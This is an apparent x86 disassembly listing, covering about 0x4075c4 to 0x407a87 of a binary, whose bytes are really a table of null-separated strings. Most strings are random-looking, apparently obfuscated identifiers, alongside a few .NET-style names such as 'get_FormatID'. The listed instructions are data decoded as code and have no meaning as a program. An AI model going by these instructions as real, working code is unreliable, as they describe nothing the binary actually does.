  4075c4:	68 72 62 42 49       	push   $0x49426272
  4075c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4075ca:	71 64                	jno    0x407630
  4075cc:	41                   	inc    %ecx
  4075cd:	00 48 47             	add    %cl,0x47(%eax)
  4075d0:	54                   	push   %esp
  4075d1:	67 7a 75             	addr16 jp 0x407649
  4075d4:	63 6b 59             	arpl   %ebp,0x59(%ebx)
  4075d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4075d8:	41                   	inc    %ecx
  4075d9:	00 5a 66             	add    %bl,0x66(%edx)
  4075dc:	76 6e                	jbe    0x40764c
  4075de:	55                   	push   %ebp
  4075df:	54                   	push   %esp
  4075e0:	61                   	popa
  4075e1:	72 69                	jb     0x40764c
  4075e3:	73 41                	jae    0x407626
  4075e5:	00 61 7a             	add    %ah,0x7a(%ecx)
  4075e8:	42                   	inc    %edx
  4075e9:	4d                   	dec    %ebp
  4075ea:	62 53 45             	bound  %edx,0x45(%ebx)
  4075ed:	73 4e                	jae    0x40763d
  4075ef:	78 5a                	js     0x40764b
  4075f1:	78 41                	js     0x407634
  4075f3:	00 55 59             	add    %dl,0x59(%ebp)
  4075f6:	76 47                	jbe    0x40763f
  4075f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4075f9:	61                   	popa
  4075fa:	54                   	push   %esp
  4075fb:	4f                   	dec    %edi
  4075fc:	6b 43 54 6f          	imul   $0x6f,0x54(%ebx),%eax
  407600:	41                   	inc    %ecx
  407601:	42                   	inc    %edx
  407602:	00 52 51             	add    %dl,0x51(%edx)
  407605:	76 50                	jbe    0x407657
  407607:	6c                   	insb   (%dx),%es:(%edi)
  407608:	78 47                	js     0x407651
  40760a:	48                   	dec    %eax
  40760b:	49                   	dec    %ecx
  40760c:	67 43                	addr16 inc %ebx
  40760e:	42                   	inc    %edx
  40760f:	00 71 75             	add    %dh,0x75(%ecx)
  407612:	67 54                	addr16 push %esp
  407614:	61                   	popa
  407615:	5a                   	pop    %edx
  407616:	68 71 72 45 42       	push   $0x42457271
  40761b:	00 56 43             	add    %dl,0x43(%esi)
  40761e:	4d                   	dec    %ebp
  40761f:	6c                   	insb   (%dx),%es:(%edi)
  407620:	7a 6a                	jp     0x40768c
  407622:	41                   	inc    %ecx
  407623:	79 4e                	jns    0x407673
  407625:	59                   	pop    %ecx
  407626:	66 55                	push   %bp
  407628:	42                   	inc    %edx
  407629:	00 55 79             	add    %dl,0x79(%ebp)
  40762c:	50                   	push   %eax
  40762d:	6a 44                	push   $0x44
  40762f:	6a 43                	push   $0x43
  407631:	6c                   	insb   (%dx),%es:(%edi)
  407632:	47                   	inc    %edi
  407633:	5a                   	pop    %edx
  407634:	69 6c 53 61 42 00 53 	imul   $0x75530042,0x61(%ebx,%edx,2),%ebp
  40763b:	75 
  40763c:	79 6c                	jns    0x4076aa
  40763e:	46                   	inc    %esi
  40763f:	4f                   	dec    %edi
  407640:	66 75 44             	data16 jne 0x407687
  407643:	41                   	inc    %ecx
  407644:	43                   	inc    %ebx
  407645:	00 47 43             	add    %al,0x43(%edi)
  407648:	00 4e 42             	add    %cl,0x42(%esi)
  40764b:	4e                   	dec    %esi
  40764c:	72 41                	jb     0x40768f
  40764e:	44                   	inc    %esp
  40764f:	70 58                	jo     0x4076a9
  407651:	55                   	push   %ebp
  407652:	65 4c                	gs dec %esp
  407654:	43                   	inc    %ebx
  407655:	00 6d 44             	add    %ch,0x44(%ebp)
  407658:	6c                   	insb   (%dx),%es:(%edi)
  407659:	66 6b 6c 63 52 4c    	imul   $0x4c,0x52(%ebx,%eiz,2),%bp
  40765f:	67 62 59 43          	bound  %ebx,0x43(%bx,%di)
  407663:	00 43 5a             	add    %al,0x5a(%ebx)
  407666:	62 6e 43             	bound  %ebp,0x43(%esi)
  407669:	6b 57 6f 70          	imul   $0x70,0x6f(%edi),%edx
  40766d:	72 42                	jb     0x4076b1
  40766f:	41                   	inc    %ecx
  407670:	7a 6a                	jp     0x4076dc
  407672:	43                   	inc    %ebx
  407673:	00 53 72             	add    %dl,0x72(%ebx)
  407676:	6f                   	outsl  %ds:(%esi),(%dx)
  407677:	7a 4a                	jp     0x4076c3
  407679:	6a 47                	push   $0x47
  40767b:	45                   	inc    %ebp
  40767c:	6c                   	insb   (%dx),%es:(%edi)
  40767d:	43                   	inc    %ebx
  40767e:	00 66 50             	add    %ah,0x50(%esi)
  407681:	6d                   	insl   (%dx),%es:(%edi)
  407682:	49                   	dec    %ecx
  407683:	59                   	pop    %ecx
  407684:	6e                   	outsb  %ds:(%esi),(%dx)
  407685:	71 6a                	jno    0x4076f1
  407687:	50                   	push   %eax
  407688:	62 4b 6e             	bound  %ecx,0x6e(%ebx)
  40768b:	6f                   	outsl  %ds:(%esi),(%dx)
  40768c:	43                   	inc    %ebx
  40768d:	00 53 58             	add    %dl,0x58(%ebx)
  407690:	52                   	push   %edx
  407691:	67 59                	addr16 pop %ecx
  407693:	74 74                	je     0x407709
  407695:	76 49                	jbe    0x4076e0
  407697:	5a                   	pop    %edx
  407698:	73 43                	jae    0x4076dd
  40769a:	00 41 67             	add    %al,0x67(%ecx)
  40769d:	5a                   	pop    %edx
  40769e:	45                   	inc    %ebp
  40769f:	42                   	inc    %edx
  4076a0:	43                   	inc    %ebx
  4076a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4076a2:	48                   	dec    %eax
  4076a3:	79 43                	jns    0x4076e8
  4076a5:	00 79 54             	add    %bh,0x54(%ecx)
  4076a8:	53                   	push   %ebx
  4076a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4076aa:	6a 6f                	push   $0x6f
  4076ac:	72 68                	jb     0x407716
  4076ae:	69 47 45 44 00 79 58 	imul   $0x58790044,0x45(%edi),%eax
  4076b5:	6b 73 6c 61          	imul   $0x61,0x6c(%ebx),%esi
  4076b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4076ba:	4e                   	dec    %esi
  4076bb:	64 44                	fs inc %esp
  4076bd:	46                   	inc    %esi
  4076be:	44                   	inc    %esp
  4076bf:	00 4d 61             	add    %cl,0x61(%ebp)
  4076c2:	70 4e                	jo     0x407712
  4076c4:	61                   	popa
  4076c5:	6d                   	insl   (%dx),%es:(%edi)
  4076c6:	65 54                	gs push %esp
  4076c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4076c9:	4f                   	dec    %edi
  4076ca:	49                   	dec    %ecx
  4076cb:	44                   	inc    %esp
  4076cc:	00 67 65             	add    %ah,0x65(%edi)
  4076cf:	74 5f                	je     0x407730
  4076d1:	46                   	inc    %esi
  4076d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4076d3:	72 6d                	jb     0x407742
  4076d5:	61                   	popa
  4076d6:	74 49                	je     0x407721
  4076d8:	44                   	inc    %esp
  4076d9:	00 58 57             	add    %bl,0x57(%eax)
  4076dc:	63 6c 6a 6e          	arpl   %ebp,0x6e(%edx,%ebp,2)
  4076e0:	7a 4f                	jp     0x407731
  4076e2:	4a                   	dec    %edx
  4076e3:	44                   	inc    %esp
  4076e4:	00 66 51             	add    %ah,0x51(%esi)
  4076e7:	62 59 6a             	bound  %ebx,0x6a(%ecx)
  4076ea:	51                   	push   %ecx
  4076eb:	73 68                	jae    0x407755
  4076ed:	62 43 5a             	bound  %eax,0x5a(%ebx)
  4076f0:	4c                   	dec    %esp
  4076f1:	44                   	inc    %esp
  4076f2:	00 70 65             	add    %dh,0x65(%eax)
  4076f5:	70 41                	jo     0x407738
  4076f7:	50                   	push   %eax
  4076f8:	61                   	popa
  4076f9:	49                   	dec    %ecx
  4076fa:	73 77                	jae    0x407773
  4076fc:	62 54 66 44          	bound  %edx,0x44(%esi,%eiz,2)
  407700:	00 52 6d             	add    %dl,0x6d(%edx)
  407703:	50                   	push   %eax
  407704:	4f                   	dec    %edi
  407705:	4b                   	dec    %ebx
  407706:	4b                   	dec    %ebx
  407707:	6d                   	insl   (%dx),%es:(%edi)
  407708:	64 76 67             	fs jbe 0x407772
  40770b:	44                   	inc    %esp
  40770c:	00 65 50             	add    %ah,0x50(%ebp)
  40770f:	7a 49                	jp     0x40775a
  407711:	79 4b                	jns    0x40775e
  407713:	54                   	push   %esp
  407714:	47                   	inc    %edi
  407715:	71 71                	jno    0x407788
  407717:	77 69                	ja     0x407782
  407719:	44                   	inc    %esp
  40771a:	00 51 6c             	add    %dl,0x6c(%ecx)
  40771d:	75 42                	jne    0x407761
  40771f:	65 51                	gs push %ecx
  407721:	77 6b                	ja     0x40778e
  407723:	42                   	inc    %edx
  407724:	6b 44 00 62 73       	imul   $0x73,0x62(%eax,%eax,1),%eax
  407729:	59                   	pop    %ecx
  40772a:	68 62 45 4e 46       	push   $0x464e4562
  40772f:	6d                   	insl   (%dx),%es:(%edi)
  407730:	41                   	inc    %ecx
  407731:	6e                   	outsb  %ds:(%esi),(%dx)
  407732:	44                   	inc    %esp
  407733:	00 68 70             	add    %ch,0x70(%eax)
  407736:	53                   	push   %ebx
  407737:	48                   	dec    %eax
  407738:	70 4b                	jo     0x407785
  40773a:	73 53                	jae    0x40778f
  40773c:	67 76 44             	addr16 jbe 0x407783
  40773f:	00 51 61             	add    %dl,0x61(%ecx)
  407742:	61                   	popa
  407743:	56                   	push   %esi
  407744:	48                   	dec    %eax
  407745:	53                   	push   %ebx
  407746:	5a                   	pop    %edx
  407747:	4c                   	dec    %esp
  407748:	77 68                	ja     0x4077b2
  40774a:	7a 44                	jp     0x407790
  40774c:	00 7a 62             	add    %bh,0x62(%edx)
  40774f:	65 61                	gs popa
  407751:	4a                   	dec    %edx
  407752:	6d                   	insl   (%dx),%es:(%edi)
  407753:	75 54                	jne    0x4077a9
  407755:	4b                   	dec    %ebx
  407756:	53                   	push   %ebx
  407757:	63 63 7a             	arpl   %esp,0x7a(%ebx)
  40775a:	49                   	dec    %ecx
  40775b:	45                   	inc    %ebp
  40775c:	00 62 4d             	add    %ah,0x4d(%edx)
  40775f:	47                   	inc    %edi
  407760:	6b 75 79 4b          	imul   $0x4b,0x79(%ebp),%esi
  407764:	6d                   	insl   (%dx),%es:(%edi)
  407765:	45                   	inc    %ebp
  407766:	79 54                	jns    0x4077bc
  407768:	45                   	inc    %ebp
  407769:	00 7a 6c             	add    %bh,0x6c(%edx)
  40776c:	45                   	inc    %ebp
  40776d:	59                   	pop    %ecx
  40776e:	4e                   	dec    %esi
  40776f:	46                   	inc    %esi
  407770:	58                   	pop    %eax
  407771:	76 51                	jbe    0x4077c4
  407773:	59                   	pop    %ecx
  407774:	45                   	inc    %ebp
  407775:	00 6a 44             	add    %ch,0x44(%edx)
  407778:	7a 52                	jp     0x4077cc
  40777a:	62 66 44             	bound  %esp,0x44(%esi)
  40777d:	72 69                	jb     0x4077e8
  40777f:	53                   	push   %ebx
  407780:	64 69 6e 45 00 57 76 	imul   $0x66765700,%fs:0x45(%esi),%ebp
  407787:	66 
  407788:	42                   	inc    %edx
  407789:	79 51                	jns    0x4077dc
  40778b:	5a                   	pop    %edx
  40778c:	55                   	push   %ebp
  40778d:	46                   	inc    %esi
  40778e:	42                   	inc    %edx
  40778f:	4d                   	dec    %ebp
  407790:	42                   	inc    %edx
  407791:	46                   	inc    %esi
  407792:	00 53 58             	add    %dl,0x58(%ebx)
  407795:	73 43                	jae    0x4077da
  407797:	4b                   	dec    %ebx
  407798:	44                   	inc    %esp
  407799:	41                   	inc    %ecx
  40779a:	54                   	push   %esp
  40779b:	79 4f                	jns    0x4077ec
  40779d:	45                   	inc    %ebp
  40779e:	46                   	inc    %esi
  40779f:	00 49 72             	add    %cl,0x72(%ecx)
  4077a2:	48                   	dec    %eax
  4077a3:	6d                   	insl   (%dx),%es:(%edi)
  4077a4:	71 4c                	jno    0x4077f2
  4077a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4077a7:	76 42                	jbe    0x4077eb
  4077a9:	66 75 4c             	data16 jne 0x4077f8
  4077ac:	46                   	inc    %esi
  4077ad:	00 56 78             	add    %dl,0x78(%esi)
  4077b0:	78 6e                	js     0x407820
  4077b2:	42                   	inc    %edx
  4077b3:	67 6e                	outsb  %ds:(%si),(%dx)
  4077b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4077b6:	46                   	inc    %esi
  4077b7:	49                   	dec    %ecx
  4077b8:	4e                   	dec    %esi
  4077b9:	46                   	inc    %esi
  4077ba:	00 4e 7a             	add    %cl,0x7a(%esi)
  4077bd:	78 54                	js     0x407813
  4077bf:	45                   	inc    %ebp
  4077c0:	74 48                	je     0x40780a
  4077c2:	56                   	push   %esi
  4077c3:	54                   	push   %esp
  4077c4:	54                   	push   %esp
  4077c5:	46                   	inc    %esi
  4077c6:	00 66 6a             	add    %ah,0x6a(%esi)
  4077c9:	42                   	inc    %edx
  4077ca:	62 78 42             	bound  %edi,0x42(%eax)
  4077cd:	56                   	push   %esi
  4077ce:	65 6b 46 54 61       	imul   $0x61,%gs:0x54(%esi),%eax
  4077d3:	45                   	inc    %ebp
  4077d4:	56                   	push   %esi
  4077d5:	46                   	inc    %esi
  4077d6:	00 7a 55             	add    %bh,0x55(%edx)
  4077d9:	4f                   	dec    %edi
  4077da:	4a                   	dec    %edx
  4077db:	4a                   	dec    %edx
  4077dc:	65 77 71             	gs ja  0x407850
  4077df:	46                   	inc    %esi
  4077e0:	43                   	inc    %ebx
  4077e1:	59                   	pop    %ecx
  4077e2:	46                   	inc    %esi
  4077e3:	00 65 69             	add    %ah,0x69(%ebp)
  4077e6:	42                   	inc    %edx
  4077e7:	66 57                	push   %di
  4077e9:	6a 45                	push   $0x45
  4077eb:	54                   	push   %esp
  4077ec:	56                   	push   %esi
  4077ed:	58                   	pop    %eax
  4077ee:	67 46                	addr16 inc %esi
  4077f0:	00 66 4a             	add    %ah,0x4a(%esi)
  4077f3:	43                   	inc    %ebx
  4077f4:	50                   	push   %eax
  4077f5:	55                   	push   %ebp
  4077f6:	54                   	push   %esp
  4077f7:	6c                   	insb   (%dx),%es:(%edi)
  4077f8:	41                   	inc    %ecx
  4077f9:	6c                   	insb   (%dx),%es:(%edi)
  4077fa:	46                   	inc    %esi
  4077fb:	00 51 78             	add    %dl,0x78(%ecx)
  4077fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4077ff:	79 4f                	jns    0x407850
  407801:	57                   	push   %edi
  407802:	78 76                	js     0x40787a
  407804:	45                   	inc    %ebp
  407805:	4c                   	dec    %esp
  407806:	42                   	inc    %edx
  407807:	71 46                	jno    0x40784f
  407809:	00 50 50             	add    %dl,0x50(%eax)
  40780c:	55                   	push   %ebp
  40780d:	6a 62                	push   $0x62
  40780f:	4b                   	dec    %ebx
  407810:	67 6a 62             	addr16 push $0x62
  407813:	4f                   	dec    %edi
  407814:	67 73 46             	addr16 jae 0x40785d
  407817:	00 49 55             	add    %cl,0x55(%ecx)
  40781a:	43                   	inc    %ebx
  40781b:	52                   	push   %edx
  40781c:	51                   	push   %ecx
  40781d:	57                   	push   %edi
  40781e:	4e                   	dec    %esi
  40781f:	6e                   	outsb  %ds:(%esi),(%dx)
  407820:	78 50                	js     0x407872
  407822:	59                   	pop    %ecx
  407823:	78 54                	js     0x407879
  407825:	78 46                	js     0x40786d
  407827:	00 61 51             	add    %ah,0x51(%ecx)
  40782a:	56                   	push   %esi
  40782b:	77 57                	ja     0x407884
  40782d:	65 68 5a 74 42 47    	gs push $0x4742745a
  407833:	00 53 56             	add    %dl,0x56(%ebx)
  407836:	64 65 68 43 72 4c 4d 	fs gs push $0x4d4c7243
  40783d:	55                   	push   %ebp
  40783e:	49                   	dec    %ecx
  40783f:	53                   	push   %ebx
  407840:	4a                   	dec    %edx
  407841:	4a                   	dec    %edx
  407842:	47                   	inc    %edi
  407843:	00 48 75             	add    %cl,0x75(%eax)
  407846:	72 65                	jb     0x4078ad
  407848:	72 4a                	jb     0x407894
  40784a:	74 41                	je     0x40788d
  40784c:	56                   	push   %esi
  40784d:	4a                   	dec    %edx
  40784e:	51                   	push   %ecx
  40784f:	69 54 55 73 59 47 00 	imul   $0x4e004759,0x73(%ebp,%edx,2),%edx
  407856:	4e 
  407857:	58                   	pop    %eax
  407858:	6b 51 76 71          	imul   $0x71,0x76(%ecx),%edx
  40785c:	79 67                	jns    0x4078c5
  40785e:	47                   	inc    %edi
  40785f:	45                   	inc    %ebp
  407860:	4a                   	dec    %edx
  407861:	62 47 00             	bound  %eax,0x0(%edi)
  407864:	49                   	dec    %ecx
  407865:	50                   	push   %eax
  407866:	47                   	inc    %edi
  407867:	68 41 50 56 69       	push   $0x69565041
  40786c:	70 58                	jo     0x4078c6
  40786e:	71 47                	jno    0x4078b7
  407870:	00 76 7a             	add    %dh,0x7a(%esi)
  407873:	4b                   	dec    %ebx
  407874:	6c                   	insb   (%dx),%es:(%edi)
  407875:	41                   	inc    %ecx
  407876:	46                   	inc    %esi
  407877:	45                   	inc    %ebp
  407878:	46                   	inc    %esi
  407879:	45                   	inc    %ebp
  40787a:	52                   	push   %edx
  40787b:	4b                   	dec    %ebx
  40787c:	46                   	inc    %esi
  40787d:	48                   	dec    %eax
  40787e:	00 50 72             	add    %dl,0x72(%eax)
  407881:	63 62 61             	arpl   %esp,0x61(%edx)
  407884:	4c                   	dec    %esp
  407885:	77 76                	ja     0x4078fd
  407887:	67 48                	addr16 dec %eax
  407889:	6a 42                	push   $0x42
  40788b:	49                   	dec    %ecx
  40788c:	48                   	dec    %eax
  40788d:	00 69 6b             	add    %ch,0x6b(%ecx)
  407890:	54                   	push   %esp
  407891:	45                   	inc    %ebp
  407892:	69 4e 42 64 64 75 6b 	imul   $0x6b756464,0x42(%esi),%ecx
  407899:	41                   	inc    %ecx
  40789a:	56                   	push   %esi
  40789b:	48                   	dec    %eax
  40789c:	00 6a 69             	add    %ch,0x69(%edx)
  40789f:	4d                   	dec    %ebp
  4078a0:	76 69                	jbe    0x40790b
  4078a2:	72 52                	jb     0x4078f6
  4078a4:	48                   	dec    %eax
  4078a5:	64 53                	fs push %ebx
  4078a7:	61                   	popa
  4078a8:	48                   	dec    %eax
  4078a9:	00 52 68             	add    %dl,0x68(%edx)
  4078ac:	66 73 79             	data16 jae 0x407928
  4078af:	55                   	push   %ebp
  4078b0:	68 4a 62 48 00       	push   $0x48624a
  4078b5:	46                   	inc    %esi
  4078b6:	5a                   	pop    %edx
  4078b7:	54                   	push   %esp
  4078b8:	44                   	inc    %esp
  4078b9:	56                   	push   %esi
  4078ba:	53                   	push   %ebx
  4078bb:	4f                   	dec    %edi
  4078bc:	58                   	pop    %eax
  4078bd:	78 4f                	js     0x40790e
  4078bf:	44                   	inc    %esp
  4078c0:	65 48                	gs dec %eax
  4078c2:	00 61 73             	add    %ah,0x73(%ecx)
  4078c5:	6a 6d                	push   $0x6d
  4078c7:	79 49                	jns    0x407912
  4078c9:	61                   	popa
  4078ca:	4e                   	dec    %esi
  4078cb:	41                   	inc    %ecx
  4078cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4078cd:	78 6c                	js     0x40793b
  4078cf:	48                   	dec    %eax
  4078d0:	00 62 6a             	add    %ah,0x6a(%edx)
  4078d3:	59                   	pop    %ecx
  4078d4:	4b                   	dec    %ebx
  4078d5:	74 75                	je     0x40794c
  4078d7:	74 77                	je     0x407950
  4078d9:	4a                   	dec    %edx
  4078da:	48                   	dec    %eax
  4078db:	49                   	dec    %ecx
  4078dc:	00 67 65             	add    %ah,0x65(%edi)
  4078df:	74 5f                	je     0x407940
  4078e1:	41                   	inc    %ecx
  4078e2:	53                   	push   %ebx
  4078e3:	43                   	inc    %ebx
  4078e4:	49                   	dec    %ecx
  4078e5:	49                   	dec    %ecx
  4078e6:	00 6f 4e             	add    %ch,0x4e(%edi)
  4078e9:	78 6f                	js     0x40795a
  4078eb:	4e                   	dec    %esi
  4078ec:	62 71 43             	bound  %esi,0x43(%ecx)
  4078ef:	59                   	pop    %ecx
  4078f0:	4e                   	dec    %esi
  4078f1:	49                   	dec    %ecx
  4078f2:	00 63 44             	add    %ah,0x44(%ebx)
  4078f5:	42                   	inc    %edx
  4078f6:	54                   	push   %esp
  4078f7:	72 4b                	jb     0x407944
  4078f9:	64 68 47 59 58 53    	fs push $0x53585947
  4078ff:	49                   	dec    %ecx
  407900:	00 61 6a             	add    %ah,0x6a(%ecx)
  407903:	76 67                	jbe    0x40796c
  407905:	5a                   	pop    %edx
  407906:	73 55                	jae    0x40795d
  407908:	58                   	pop    %eax
  407909:	54                   	push   %esp
  40790a:	66 76 63             	data16 jbe 0x407970
  40790d:	49                   	dec    %ecx
  40790e:	00 6e 4a             	add    %ch,0x4a(%esi)
  407911:	66 4a                	dec    %dx
  407913:	61                   	popa
  407914:	51                   	push   %ecx
  407915:	75 7a                	jne    0x407991
  407917:	75 68                	jne    0x407981
  407919:	50                   	push   %eax
  40791a:	51                   	push   %ecx
  40791b:	65 49                	gs dec %ecx
  40791d:	00 70 63             	add    %dh,0x63(%eax)
  407920:	4d                   	dec    %ebp
  407921:	61                   	popa
  407922:	66 6a 69             	pushw  $0x69
  407925:	64 56                	fs push %esi
  407927:	68 67 6b 49 00       	push   $0x496b67
  40792c:	44                   	inc    %esp
  40792d:	70 53                	jo     0x407982
  40792f:	6c                   	insb   (%dx),%es:(%edi)
  407930:	71 49                	jno    0x40797b
  407932:	57                   	push   %edi
  407933:	46                   	inc    %esi
  407934:	74 49                	je     0x40797f
  407936:	00 4b 61             	add    %cl,0x61(%ebx)
  407939:	4d                   	dec    %ebp
  40793a:	75 70                	jne    0x4079ac
  40793c:	50                   	push   %eax
  40793d:	78 51                	js     0x407990
  40793f:	47                   	inc    %edi
  407940:	75 42                	jne    0x407984
  407942:	4a                   	dec    %edx
  407943:	00 64 71 50          	add    %ah,0x50(%ecx,%esi,2)
  407947:	61                   	popa
  407948:	79 43                	jns    0x40798d
  40794a:	77 6e                	ja     0x4079ba
  40794c:	6b 71 66 48          	imul   $0x48,0x66(%ecx),%esi
  407950:	4a                   	dec    %edx
  407951:	00 6e 4b             	add    %ch,0x4b(%esi)
  407954:	72 61                	jb     0x4079b7
  407956:	49                   	dec    %ecx
  407957:	75 47                	jne    0x4079a0
  407959:	47                   	inc    %edi
  40795a:	4e                   	dec    %esi
  40795b:	74 6b                	je     0x4079c8
  40795d:	50                   	push   %eax
  40795e:	53                   	push   %ebx
  40795f:	4a                   	dec    %edx
  407960:	00 57 6c             	add    %dl,0x6c(%edi)
  407963:	62 4e 73             	bound  %ecx,0x73(%esi)
  407966:	63 79 6c             	arpl   %edi,0x6c(%ecx)
  407969:	48                   	dec    %eax
  40796a:	68 4a 00 4e 49       	push   $0x494e004a
  40796f:	4b                   	dec    %ebx
  407970:	4a                   	dec    %edx
  407971:	44                   	inc    %esp
  407972:	74 66                	je     0x4079da
  407974:	77 53                	ja     0x4079c9
  407976:	42                   	inc    %edx
  407977:	44                   	inc    %esp
  407978:	6f                   	outsl  %ds:(%esi),(%dx)
  407979:	4a                   	dec    %edx
  40797a:	00 69 43             	add    %ch,0x43(%ecx)
  40797d:	72 59                	jb     0x4079d8
  40797f:	69 73 7a 61 71 70 4a 	imul   $0x4a707161,0x7a(%ebx),%esi
  407986:	00 56 52             	add    %dl,0x52(%esi)
  407989:	66 4d                	dec    %bp
  40798b:	45                   	inc    %ebp
  40798c:	4c                   	dec    %esp
  40798d:	49                   	dec    %ecx
  40798e:	46                   	inc    %esi
  40798f:	4d                   	dec    %ebp
  407990:	77 5a                	ja     0x4079ec
  407992:	41                   	inc    %ecx
  407993:	4b                   	dec    %ebx
  407994:	00 73 76             	add    %dh,0x76(%ebx)
  407997:	6b 4d 55 59          	imul   $0x59,0x55(%ebp),%ecx
  40799b:	71 50                	jno    0x4079ed
  40799d:	61                   	popa
  40799e:	42                   	inc    %edx
  40799f:	4b                   	dec    %ebx
  4079a0:	00 59 70             	add    %bl,0x70(%ecx)
  4079a3:	71 53                	jno    0x4079f8
  4079a5:	6d                   	insl   (%dx),%es:(%edi)
  4079a6:	77 6b                	ja     0x407a13
  4079a8:	55                   	push   %ebp
  4079a9:	45                   	inc    %ebp
  4079aa:	70 57                	jo     0x407a03
  4079ac:	6d                   	insl   (%dx),%es:(%edi)
  4079ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4079ae:	43                   	inc    %ebx
  4079af:	4b                   	dec    %ebx
  4079b0:	00 78 54             	add    %bh,0x54(%eax)
  4079b3:	4f                   	dec    %edi
  4079b4:	7a 4b                	jp     0x407a01
  4079b6:	77 68                	ja     0x407a20
  4079b8:	50                   	push   %eax
  4079b9:	45                   	inc    %ebp
  4079ba:	4b                   	dec    %ebx
  4079bb:	00 66 55             	add    %ah,0x55(%esi)
  4079be:	65 6c                	gs insb (%dx),%es:(%edi)
  4079c0:	73 48                	jae    0x407a0a
  4079c2:	6a 78                	push   $0x78
  4079c4:	68 42 75 56 46       	push   $0x46567542
  4079c9:	4b                   	dec    %ebx
  4079ca:	00 6f 78             	add    %ch,0x78(%edi)
  4079cd:	44                   	inc    %esp
  4079ce:	54                   	push   %esp
  4079cf:	61                   	popa
  4079d0:	75 61                	jne    0x407a33
  4079d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4079d3:	6b 46 4b 4b          	imul   $0x4b,0x4b(%esi),%eax
  4079d7:	00 4c 63 6d          	add    %cl,0x6d(%ebx,%eiz,2)
  4079db:	4d                   	dec    %ebp
  4079dc:	43                   	inc    %ebx
  4079dd:	42                   	inc    %edx
  4079de:	72 5a                	jb     0x407a3a
  4079e0:	72 66                	jb     0x407a48
  4079e2:	69 4f 4b 00 6d 4d 73 	imul   $0x734d6d00,0x4b(%edi),%ecx
  4079e9:	4e                   	dec    %esi
  4079ea:	57                   	push   %edi
  4079eb:	41                   	inc    %ecx
  4079ec:	49                   	dec    %ecx
  4079ed:	41                   	inc    %ecx
  4079ee:	4a                   	dec    %edx
  4079ef:	7a 51                	jp     0x407a42
  4079f1:	4b                   	dec    %ebx
  4079f2:	00 58 48             	add    %bl,0x48(%eax)
  4079f5:	4e                   	dec    %esi
  4079f6:	72 41                	jb     0x407a39
  4079f8:	50                   	push   %eax
  4079f9:	61                   	popa
  4079fa:	54                   	push   %esp
  4079fb:	54                   	push   %esp
  4079fc:	43                   	inc    %ebx
  4079fd:	50                   	push   %eax
  4079fe:	6d                   	insl   (%dx),%es:(%edi)
  4079ff:	4b                   	dec    %ebx
  407a00:	00 58 56             	add    %bl,0x56(%eax)
  407a03:	52                   	push   %edx
  407a04:	46                   	inc    %esi
  407a05:	64 78 77             	fs js  0x407a7f
  407a08:	59                   	pop    %ecx
  407a09:	46                   	inc    %esi
  407a0a:	75 7a                	jne    0x407a86
  407a0c:	64 70 4b             	fs jo  0x407a5a
  407a0f:	00 49 76             	add    %cl,0x76(%ecx)
  407a12:	53                   	push   %ebx
  407a13:	47                   	inc    %edi
  407a14:	74 61                	je     0x407a77
  407a16:	6c                   	insb   (%dx),%es:(%edi)
  407a17:	50                   	push   %eax
  407a18:	4d                   	dec    %ebp
  407a19:	56                   	push   %esi
  407a1a:	48                   	dec    %eax
  407a1b:	64 42                	fs inc %edx
  407a1d:	57                   	push   %edi
  407a1e:	45                   	inc    %ebp
  407a1f:	4c                   	dec    %esp
  407a20:	00 73 41             	add    %dh,0x41(%ebx)
  407a23:	74 6b                	je     0x407a90
  407a25:	69 63 4e 70 4d 72 49 	imul   $0x49724d70,0x4e(%ebx),%esp
  407a2c:	53                   	push   %ebx
  407a2d:	4c                   	dec    %esp
  407a2e:	00 47 49             	add    %al,0x49(%edi)
  407a31:	6a 7a                	push   $0x7a
  407a33:	47                   	inc    %edi
  407a34:	4a                   	dec    %edx
  407a35:	70 64                	jo     0x407a9b
  407a37:	4f                   	dec    %edi
  407a38:	51                   	push   %ecx
  407a39:	53                   	push   %ebx
  407a3a:	4c                   	dec    %esp
  407a3b:	00 56 43             	add    %dl,0x43(%esi)
  407a3e:	44                   	inc    %esp
  407a3f:	6e                   	outsb  %ds:(%esi),(%dx)
  407a40:	6e                   	outsb  %ds:(%esi),(%dx)
  407a41:	54                   	push   %esp
  407a42:	63 75 41             	arpl   %esi,0x41(%ebp)
  407a45:	58                   	pop    %eax
  407a46:	4c                   	dec    %esp
  407a47:	00 68 71             	add    %ch,0x71(%eax)
  407a4a:	43                   	inc    %ebx
  407a4b:	47                   	inc    %edi
  407a4c:	6b 6a 55 69          	imul   $0x69,0x55(%edx),%ebp
  407a50:	65 6d                	gs insl (%dx),%es:(%edi)
  407a52:	4c                   	dec    %esp
  407a53:	00 44 4c 61          	add    %al,0x61(%esp,%ecx,2)
  407a57:	77 43                	ja     0x407a9c
  407a59:	61                   	popa
  407a5a:	79 67                	jns    0x407ac3
  407a5c:	74 6f                	je     0x407acd
  407a5e:	50                   	push   %eax
  407a5f:	69 65 4c 4d 00 7a 70 	imul   $0x707a004d,0x4c(%ebp),%esp
  407a66:	6c                   	insb   (%dx),%es:(%edi)
  407a67:	64 61                	fs popa
  407a69:	73 42                	jae    0x407aad
  407a6b:	54                   	push   %esp
  407a6c:	74 65                	je     0x407ad3
  407a6e:	78 4e                	js     0x407abe
  407a70:	4d                   	dec    %ebp
  407a71:	00 50 55             	add    %dl,0x55(%eax)
  407a74:	56                   	push   %esi
  407a75:	4d                   	dec    %ebp
  407a76:	53                   	push   %ebx
  407a77:	78 6f                	js     0x407ae8
  407a79:	50                   	push   %eax
  407a7a:	43                   	inc    %ebx
  407a7b:	79 4e                	jns    0x407acb
  407a7d:	4b                   	dec    %ebx
  407a7e:	71 59                	jno    0x407ad9
  407a80:	4d                   	dec    %ebp
  407a81:	00 76 41             	add    %dh,0x41(%esi)
  407a84:	45                   	inc    %ebp
  407a85:	58                   	pop    %eax
  407a86:	43                   	inc    %ebx
  407a87:	62 52 46             	bound  %edx,0x46(%edx)
